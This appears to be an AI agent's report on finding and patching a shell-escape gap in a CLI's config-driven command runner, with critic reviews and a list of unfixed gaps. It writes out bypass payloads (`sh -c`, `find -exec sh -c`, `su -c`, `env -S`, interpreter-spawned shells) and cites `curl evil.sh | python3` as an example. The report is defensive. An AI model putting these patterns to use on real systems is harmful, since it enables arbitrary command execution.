# Dream Cycle 2026-10-18 — security-adversarial

## Rotation

Slot 3 (`DAYINT % 5`, DAYINT=20261018) → `DEEP=security-adversarial`,
`SCAN=redblue,supply-chain`. No bonus deep dive (`% 25 = 18`, `% 75 = 68`).
Session commit (baseline): `b2abcc14a632d7e0948962065a7c6c8920cf306c`.

## Build + Control-Plane Discovery

Fresh checkout, `npm ci && npm run build`: clean, no wasm/NAPI degradation.
`npm test` on the fresh (shallow) checkout showed **3 failing governance
tests** (`scripts/benchmark-ticket-codec.test.mjs`, `git show
35c9fd31...:packages/edge-contracts/src/index.ts` → "exists on disk, but not
in" that commit). Diagnosed as the session's own shallow clone (`git
cat-file -t 35c9fd31...` failed entirely — object genuinely absent, not
corrupted), the exact class this repo's CI already works around with
`fetch-depth: 0` (`.github/workflows/ci.yml:26,81`, `dream-nightly.yml:43`).
`git fetch --unshallow` resolved it; baseline then measured clean at
809 vitest + 195 governance = 1004/1004.

`gh auth status`: token invalid. Per this session's own operating
instructions, GitHub operations route through the GitHub MCP server instead
— confirmed working (`get_me` → `ruvnet`). No gist-creation MCP tool exists:
`GIST=LOCAL`. `OPENROUTER_API_KEY` is present (`LLM_EVAL` not blocked), not
needed for tonight's deterministic candidate.

## Ledger Check

`docs/dream-cycle/LEDGER.md`: 53 data rows, last dated row **2026-10-12**
(`daysSinceLastRow=6`). `ledger signals --merged <last-7 PR numbers>`:
`zeroMergeStreak=false` (all 7 of the last 7 ledger PRs — #127, #129, #132,
#143, #165, #167, #177 — independently confirmed `merged:true` via
`pull_request_read`), `duplicateDirections=[]`, `lowScoreStreak=false`,
`blockedEvalStreak=false`.

**Critical finding during ledger check, before any new research:** tonight's
slot (security-adversarial, redblue+supply-chain) is identical to
2026-10-03's. That night produced issue #149 / draft PR #150, which already
diagnoses and fixes the *exact* shallow-clone `BASELINE_COMMIT` failure this
session hit independently above. PR #150 is still **open, draft, and now
shows `mergeable_state: dirty`** (a conflict from 15 days of unmerged main
history) — unreviewed, unmerged. Separately, **no ledger row exists for
2026-10-03 at all** — that night's own STEP 25 (ledger append, the one
invariant meant to survive everything including a budget halt) never
completed. Neither is tonight's job to fix, but both are recorded here as
load-bearing evidence per STEP 2 ("do not rediscover a failed direction"):
tonight does **not** re-file the `BASELINE_COMMIT` fix as new work.

Further search turned up a dense, unmerged backlog on the *same* file
(`packages/compile/src/supplychain.ts`'s unpinned-`npx` detector): PR #139
(pnpm/yarn/bunx triggers, self-REJECTed, open), PR #152 (evaluatorEntrypoints
validation, open), PR #158 (npm-exec flag-before-subcommand bypass, open) —
four open drafts now touch this one area without a single merge. This is
itself a signal (review backlog, not tonight's surface to fix) worth a human
look independent of tonight's candidate.

## Deep Dive

Rather than file a fifth detector patch into that backlog, tonight asked a
different question: is `findUnpinnedNpxInvocations` (the *cosmetic warning*
detector) the real security boundary here, or is there something underneath
it that actually executes commands? Traced the real execution path:
`verify-entrypoints` (`packages/cli/src/index.ts`) reads
`evaluatorEntrypoints` from `dream.config.json` and runs each value via
`tokenizeCommand()` (`packages/cli/src/entrypoint.ts`) → `io.execFile(file,
args)` — real `child_process.execFile`, **never `shell: true`**, guarded by
`looksLikeCompoundCommand()` (refuses a standalone `&&`/`;`/`|`/`||`/`&`
token). The code's own trust-boundary comment at the call site claimed:
"execFile (never a shell) still applies regardless, so a config value
containing shell metacharacters can't act as a shell operator even if that
boundary were ever wrong."

**That claim is false, and live-reproducible.** `tokenizeCommand`'s
double-quote handling (correctly) folds a `-c "..."` payload into one token,
so a config value of `sh -c "echo A && echo B"` produces argv `['sh', '-c',
'echo A && echo B']` — no standalone `&&` token, so `looksLikeCompoundCommand`
returns `false`, and `execFile('sh', ['-c', 'echo A && echo B'])` runs for
real: `/bin/sh` genuinely interprets `&&`. `execFile`'s "never a shell"
guarantee depends entirely on *which binary* argv names; naming a shell
itself with `-c` reproduces full shell semantics without `shell: true` ever
being set anywhere.

**Live-reproduced against the real, compiled CLI binary** (not a mock): a
disposable temp config with `evaluatorEntrypoints.darwin = 'sh -c "echo
SHELL-ESCAPE-PROOF > /tmp/dm-poc/pwned.txt && echo second-stmt-ran"'`, run
through `node packages/cli/dist/bin.js verify-entrypoints`, wrote the file
and ran the second `&&`-joined statement — and reported `darwin: live (exit
0)`, further hiding the escape from anything checking exit codes.

## Hypothesis (frozen before implementation)

> Given `verify-entrypoints`' `looksLikeCompoundCommand` guard, which only
> inspects tokenized argv for a standalone shell-control-operator token, when
> a config value names a shell interpreter as (or among) its own argv with a
> literal `-c` flag, the guard is blind to it and `execFile` really invokes a
> shell — subject to: zero change to how any non-shell-invoking command is
> tokenized or classified, zero regression in the existing suite, and the fix
> must not claim completeness it does not have.

Not amended after evaluation began; widened twice, each time in direct,
disclosed response to a fresh independent critic's live-reproduced finding
(see Reward-Hack Check) — the same widen-on-live-evidence discipline this
repo's own PR #165 established.

## Candidate

`packages/cli/src/entrypoint.ts`: new exported `invokesShellInterpreter(argv)`
— true if any argv position names a shell interpreter (`sh`/`bash`/`zsh`/
`dash`/`ash`/`ksh`, by basename, path-prefix tolerant) or `su` with a literal
`-c` anywhere after it, or if `env -S`/`env --split-string <value>` is
present (its value is recursively re-tokenized and re-scanned, since it is
itself a nested command string hiding the same trick one level deeper).
Wired into `packages/cli/src/index.ts`'s `verify-entrypoints` handler
immediately after the existing `looksLikeCompoundCommand` check: on a hit,
the entry is reported `blocked` with a clear diagnostic and `execFile` is
never called. One nearby trust-boundary comment corrected to stop overclaiming.

275 changed lines across 4 files (113 in `entrypoint.ts`, 26 in `index.ts`,
the rest tests) — slightly over the usual ~300-line *candidate* target once
tests are excluded is still well under it (139 non-test lines); over because
of three disclosed widening rounds, matching PR #165's own precedent for a
security-class fix found incomplete under live critique.

## Baseline

Parent commit `b2abcc14a632d7e0948962065a7c6c8920cf306c` (`main`), measured
live via `git stash` / `git stash pop` around the full candidate diff, same
checkout, same commands, not inferred from logs.

## Evaluation Receipt

Real evaluator: `npm test` (`vitest run && npm run test:governance`).

| | Baseline (parent, unshallowed) | Candidate |
|---|---|---|
| vitest | 809 | 827 (+18, 0 regressions) |
| governance | 195 | 195 (unchanged) |
| Total | 1004/1004 | 1022/1022 |
| `npm run lint` | clean | clean |
| `npm run typecheck` | clean | clean |

Live pre/post-fix proof, four independent PoCs against the real compiled
binary (`node packages/cli/dist/bin.js verify-entrypoints <poc-config>`),
each wrapping `evaluatorEntrypoints.darwin` with a harmless file-write +
`&&`-joined second statement instead of touching the real network/npx:

1. `sh -c "echo X > f && echo Y"` — pre-fix: file written, both statements
   ran, reported `darwin: live`. Post-fix: `darwin: blocked`, file never
   created.
2. `find . -maxdepth 0 -exec sh -c "touch f && echo Y" {} +` (round-2
   critic's own repro) — same before/after.
3. `su root -c "touch f && echo Y"` (round-3 critic's own repro) — same
   before/after.
4. `env -S "sh -c 'touch f && echo Y'"` (round-3 critic's own repro) — same
   before/after.

Confirmed no false positive against this repo's real `dream.config.json`:
`bench`/`darwin` still classify exactly as before this candidate (`darwin`
still correctly `blocked` by the pre-existing, unrelated compound-command
check for its real `rm ... && npx ...` shape).

## Darwin Lineage

`DARWIN=not-applicable` — a boolean detector/guard fix has no evolvable
population to fitness-search, same judgment as every prior
compiler-parity/security-adversarial fix of this shape (#29, #79, #105,
#111, #127, #143, #150, #152, #158, #165, #167, #177).

## Evidence

OBSERVATION (shallow-clone governance failures, diagnosed and resolved via
unshallow, not this candidate's concern) → OBSERVATION (ledger/issue search:
#149/#150 already covers the shallow-clone finding; 4 open unmerged drafts
already target `supplychain.ts`) → OBSERVATION (traced `verify-entrypoints`'
real execution path, read its trust-boundary comment) → MEASUREMENT (live
repro #1: `sh -c` bypass, real file write) → HYPOTHESIS (frozen above) →
MEASUREMENT (809/195 baseline → 827/195 candidate round 1, 0 regressions) →
INFERENCE (critic round 1): BLOCKED, live repro #2 (`find -exec`) →
MEASUREMENT (widened, re-verified, repro #1 and #2 both closed) → INFERENCE
(critic round 2, fresh context): BLOCKED, live repros #3 (`su -c`) and #4
(`env -S`) → MEASUREMENT (widened again, re-verified, all four repros
closed, final suite 827/195) → DECISION (ship; verdict ACCEPT, with the
open-ended nature of the remaining gap class explicitly disclosed, not
claimed fixed).

## Reward-Hack Check

**Two independent critic subagents, fresh context each time, no authorship
stake, each instructed to try to break the candidate and run the real tests
themselves** — not a self-review:

- **Round 1: BLOCKED.** Verified round-1 tests (9/9) actually fail pre-fix
  (not tautological, confirmed via `git stash` on source-only, keeping
  tests). Found a true, undisclosed, high-severity bypass: `find -exec sh -c
  "..."` — argv[0] is `find`, not a shell, so an argv[0]-only check misses it
  even though `find` spawns `/bin/sh -c` internally; live-reproduced (wrote a
  file via `execFile` outside the repo). Also confirmed no false positive
  against real `dream.config.json`.
- **Fix widened** to scan every argv position, not just argv[0].
- **Round 2 (fresh critic, no context from round 1): BLOCKED.** Confirmed
  the round-1 gap closed (`find`/`xargs`/`parallel`/`timeout`/`nice`/`ssh`/
  `docker` wrapping `sh -c` all now caught), confirmed 133/133 tests pass,
  confirmed the round-2 tests are non-tautological via the same stash
  technique, confirmed no new false positive via a grep of this repo's own
  workflows/config/scripts. Found two more true, live-reproduced bypasses:
  `env -S "sh -c '...'"` (GNU coreutils word-splitting indirection — the same
  quoting trick one level deeper) and `su -c "..."` (not a shell itself, but
  its own `-c` spawns the target user's shell) — both confirmed live, both
  wrote a file and ran a second `&&`-joined statement.
- **Fix widened again**: `su` added to the detected-command set (identical
  mechanism); `env -S`/`--split-string <value>` (space-separated form only —
  the glued `--split-string=<value>` form was attempted and dropped after
  confirming `tokenizeCommand` itself mis-splits it into garbage tokens, not
  a usable nested command string; building a second ad-hoc parser for one
  glued flag would be its own bug source, so this is disclosed, not fixed)
  is recursively re-tokenized and re-scanned.
- Final suite: 827 vitest + 195 governance, 0 regressions, lint/typecheck
  clean. Re-verified all four PoCs (original, `find -exec`, `su -c`, `env
  -S`) blocked live against the final diff, in this same session, after the
  round-3 fix.

**No further round was dispatched.** The pattern across three rounds (each
fixing exactly what the prior round's critic found, and nothing more) is
itself evidence that this is an open-ended enumeration problem, not a
closeable one — the code's own doc comment says so explicitly (`fish`/`csh`/
`tcsh`, a combined flag like `-ic`, the glued `env` form, a renamed/symlinked
interpreter binary are disclosed, not fixed). Continuing to chase individual
wrapper names has diminishing returns; see Recommendation below for the
actual next step.

No benchmark, gold-answer, snapshot, or threshold file was touched at any
round. No existing assertion was weakened — every round is additive; the one
test removed (`--split-string=` form) was removed because the behavior it
asserted was never real (see above), replaced with a test asserting the
honest, disclosed negative.

## Security Review

This candidate **is** the security fix — it closes a live, reproducible gap
in `verify-entrypoints`' own stated "never a shell" guarantee. Scope is
explicitly bounded and stated as such, repeatedly, in the code's own doc
comment: it is defense-in-depth against a malformed/careless
`evaluatorEntrypoints` value reaching a real shell by accident, not a hard
security boundary against a deliberately adversarial config author — that
boundary has always been, and remains, "config is repo-committed,
PR-reviewed, not runtime-attacker-controlled" (the same framing this file's
own pre-existing comment and `supplychain.ts`'s header already use for the
unpinned-`npx` risk). A malicious config author could already achieve
arbitrary execution via a single well-formed command (e.g. `curl evil.sh |
python3`) regardless of anything in this diff — not newly introduced, not
newly fixed, explicitly not claimed to be addressed here.

## Scan Findings

**redblue**: this issue's whole subject — three rounds of adversarial
probing of `verify-entrypoints`' execution-safety claim, two by independent
subagent critics, each live-reproducing a real bypass of the prior round.

**supply-chain**: adjacent but distinct from `findUnpinnedNpxInvocations`
(the cosmetic unpinned-`npx` *warning* detector, which has its own
independently-tracked, already-disclosed `sh -c`-indirection blind spot,
noted in issue #68 2026-09-03 but never ported into the shipped detector).
Tonight's fix does not touch that detector, but it does lower the real-world
severity of its blind spot: even if `findUnpinnedNpxInvocations` fails to
*warn* about an `npx` call hidden inside `sh -c "..."`, `verify-entrypoints`
will now refuse to *run* that same value outright, for an unrelated reason
(shell-interpreter detection, not package-pin detection). Porting the
quote-aware/recursive scanning idea from tonight's fix into
`supplychain.ts` itself is a natural, small follow-up — not done tonight,
to keep this candidate to one conceptual change (the execution-safety gate,
not the warning detector).

## Competitors

No competitor framework surveyed in prior nights (Sakana AI Scientist,
OpenHands, DSPy/GEPA, SWE-agent, AutoGPT lineage) documents a comparable
"detect a config-driven command string that itself spawns a shell despite a
no-shell exec API" check; this remains a narrow, repo-specific hardening with
no external prior art found in earlier cycles' research, and none newly
sought tonight (no new external research beyond this repo's own history —
the whole candidate came from reading this repo's own code and its own prior
nights' evidence, not from the usual external-research step, consistent with
STEP 2's "do not rediscover" discipline redirecting effort toward evidence
already on hand).

## Gist

`GIST=LOCAL` — no `gh` CLI (`GH_TOKEN` invalid this session) and no
gist-creation MCP tool available. Full report committed at this path as the
durable artifact.

## Consolidation Refresh — 2026-11-06

MODE=CONSOLIDATE (STEP 1.5, ADR-0011): 20 open `dream/*` candidate PRs
tonight, well over `implementationTrack.reviewBacklogLimit=6`. The eleven
nearer-the-front eligible drafts — #145, #148, #150, #152, #154, #158,
#161, #180, #182, #184, #189, #192 — each already carry a
`dream-consolidate` marker for today's exact default-branch SHA (`3fc3222`)
from eleven preceding nights (`main` has not moved since #196, landed
2026-10-19). This PR (#194) was the oldest still-eligible draft (still
draft, ACCEPT in its own Evaluation Receipt, not a `routine-self-review`
PR) carrying no prior consolidate marker at all. #139 is REJECT and
excluded; #98/#101 are multi-repo portfolio branches, not single-surface
dream-cycle candidates; #137/#141/#156 are already out of draft.

**Action.** Merged `main` (`3fc3222d2e5566a203331d3686c4d2eaf06713a8`) into
this branch with an ordinary merge commit (`744705d`, never rebase, never
force-push). Zero textual conflicts. `packages/cli/src/entrypoint.ts` /
`entrypoint.test.ts` (this candidate's own files) are byte-identical
before and after the merge (`git diff 2c86a7c..744705d -- packages/cli/src/entrypoint.ts packages/cli/src/entrypoint.test.ts`
is empty); `index.ts`/`index.test.ts` auto-merged clean against substantial
intervening `main` history (Dream Cycle v2 engine, PR #195/#196) with no
overlap on this candidate's own hunks.

**Re-evaluation on the new head.** Real evaluator (`npm test`), baseline
measured independently in an isolated `git worktree` at bare
`main@3fc3222`: vitest 886/886, governance 195/195. On this merged head:
vitest 904/904 (+18, this candidate's own tests, 0 regressions), governance
195/195 unchanged. `npm run lint`/`npm run typecheck` clean. `npm run build`
clean (8 packages, no wasm/NAPI degradation). `ledger verify --since-row 38
--legacy-digest 23b02bfa98b56b374fadfb1b05df25e589dcdeab26143ae6183083d21779426a`:
OK. Self-hosted `dream.config.json` compile output byte-identical. Live
repro of all 4 original PoCs (`sh -c`, `find -exec sh -c`, `su -c`,
`env -S`) re-run against the rebuilt CLI: all still `blocked`, no file
written.

**Fresh critic + reward-hack pass (this round)**, dispatched as a
separate-context subagent with no authorship stake, given only the merged
diff and the live repository (not a reread of the prior rounds' verdict):
**CLEAR**, with one new disclosed finding. It confirmed the candidate's own
files are merge-untouched, re-ran `npm test`/`lint`/`typecheck` itself
(904/195, 0 failures, both clean), confirmed the full candidate diff
(`b2abcc1..2c86a7c`) touches only `entrypoint.ts`, `entrypoint.test.ts`,
`index.ts`, `index.test.ts` plus this report — no gold data, benchmark
corpus, threshold, `dream.config.json`, or CI/workflow file — and confirmed
every test-file change is a pure addition (no existing assertion weakened,
skipped, or removed). It also found a genuinely novel, live-reproduced
bypass class the original two rounds did not name: a general-purpose
scripting interpreter (Perl `exec`, Python `subprocess.run`, AWK `system()`)
spawning `sh -c` **inside its own process**, with no `sh`/`bash`/`-c` token
ever appearing in the entrypoint's own argv — structurally undetectable by
any argv-based scan, unlike the four already-disclosed gaps (which are all
still argv-visible). This does not change the verdict: `invokesShellInterpreter`'s
own doc comment already states it is "a denylist of known wrappers, not a
closed set" and that the real trust boundary is repo-committed, PR-reviewed
config, not a hard security boundary — this finding extends, rather than
contradicts, that disclosed posture. Recorded here as a fifth disclosed gap
(see updated next-steps below); not fixed tonight (CONSOLIDATE mode
re-evaluates the existing candidate, it does not widen one — STEPS 5-9 are
skipped).

**CI on the pushed head (`744705d`).** `git diff origin/main -- package.json
package-lock.json` from this branch is empty — the lockfile is byte-identical
to `main`'s. `npm audit --omit=dev --audit-level=high` (the production-scoped
gate `dependency-security` actually enforces): 0 vulnerabilities. Full
dev-inclusive `npm audit --audit-level=high` reproduces 15 findings (14
moderate, 1 high: `vite`/`launch-editor`, plus an `eslint`/`typescript-eslint`
cluster) — the same pre-existing, already-tracked dev-toolchain advisory
family as issue #197 (opened 2026-10-21 against PR #145, still open, no fix
PR exists yet to port; a semver-range-breaking `vite`/`eslint` bump is out
of scope for this single-detector-function fix). Not re-filing a duplicate
issue; not fixing it from this PR.

**Decision.** ACCEPT still holds and the fresh critic is clear, but
`dependency-audit` is expected red on the new head for the pre-existing
reason above, so not every required check is green — per STEP 1.5, this PR
**stays draft**. Witness refreshed below, bound to merge commit `744705d`.
One ledger row appended on this branch: `docs/dream-cycle/LEDGER.md`
(2026-11-06) — also to be noted on issue #193, since it reaches `main` only
if this PR merges.

No merge, no close, no force-push, no self-promotion, no candidate scope
change.

## Witness

```
report_sha256 : 71f8cf2e288321cbd26e1bd5ff57697065d788b6bc0d27f4121a76749ecfa406
session_commit: 744705d6c15382b46f8ba0f873aca11d9a6512c1
witness       : a0829602b1dc51455b40d107f40d4e2d95d376b44bf421674cc989ad6e7890f4
```

Computed over this file's canonical bytes (everything above this heading,
trailing whitespace collapsed to one newline — see
`@dream-machine/witness`'s `report-witness` module) — reproducible from the
committed file with no unavailable intermediate bytes. Verify:

```bash
node packages/cli/dist/bin.js witness verify-report docs/dream-cycle/2026-10-18-security-adversarial-report.md --commit 744705d6c15382b46f8ba0f873aca11d9a6512c1
```

## Recommendation

`evaluated: yes` / `verdict: ACCEPT`. All promotion-gate conditions clear:
evaluation complete (real evaluator, parent vs. candidate, identical
corpus/commands), effect positive (4 live exploits closed, 0 before this
diff), no material regression (827/195 vs. 809/195, 0 regressions, 18 net
new tests all additive), tests green, reward-hack clear (two independent
critics, each BLOCKED-then-fixed-then-cleared on their own finding), critic
clear (round 2's own finding fully closed and re-verified by this session,
no third round dispatched), witness valid (self-contained, below),
receipt reproducible (exact commands and PoC configs given above). Human
review requested for merge — this session never self-merges.

**Concrete next steps, not done tonight** (one conceptual change per PR,
per STEP 5-9):
1. Human review/merge triage for the growing unmerged backlog on
   `supplychain.ts` (#139, #152, #158) and the stale, now-conflicting #150 —
   four+ open drafts in the same narrow area is itself a signal worth a
   human look, independent of tonight's candidate.
2. Port a quote-aware/recursive scan into `findUnpinnedNpxInvocations`
   itself, so the unpinned-`npx` *warning* (not just `verify-entrypoints`'
   execution gate) also sees through `sh -c "npx pkg@latest"`.
3. If the goal is ever a hard security boundary (not defense-in-depth)
   against config content, the enumeration strategy in
   `invokesShellInterpreter` should be reconsidered in favor of an allowlist
   of expected top-level executables, since three rounds of critique each
   found a new wrapper and that pattern has no natural end.
4. The 2026-10-03 night's missing ledger row (STEP 25 never completed that
   night) is a process gap outside tonight's surface — flagged for a future
   `ledger-signals` night, not fixed here.
5. (Added 2026-11-06 consolidation.) A general-purpose scripting
   interpreter (Perl/Python/Ruby/Node/AWK/PHP/Lua/Tcl) that spawns a shell
   internally via its own `exec`/`system`/`subprocess` — live-confirmed for
   `perl -e 'exec(...)'`, `python3 -c 'subprocess.run(...)'`, and AWK's
   `system()` — is structurally invisible to any argv-based scan, unlike
   the four gaps above. No further widening of `invokesShellInterpreter`
   can close this; it would need a different trust-boundary design (e.g.
   an interpreter allowlist/denylist on the entrypoint executable itself,
   or dropping the "defense-in-depth against careless config" framing in
   favor of treating any config-named executable as fully trusted code, as
   `supplychain.ts`'s own header comment already does for unpinned `npx`).

## Merge Policy

**Human review required.** This session never self-merges and never
autonomously promotes candidate state. Guarded auto-merge
(`.github/workflows/automerge.yml`) requires the `automerge-safe` label on a
PR touching no protected path, green on all required checks — not applied
here; a security-execution-path fix is exactly the kind of change left to a
human decision, not self-labeled.
